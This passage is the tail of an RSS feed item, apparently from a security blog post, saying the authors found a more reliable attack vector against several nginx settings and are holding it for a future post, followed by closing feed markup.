<p>Trying to make this more practical in real world environments, we actually found another attack vector which is more reliable and worked on several nginx settings. However, we will keep it for another post.</p>

  ]]></description>
</item>

</channel>
</rss>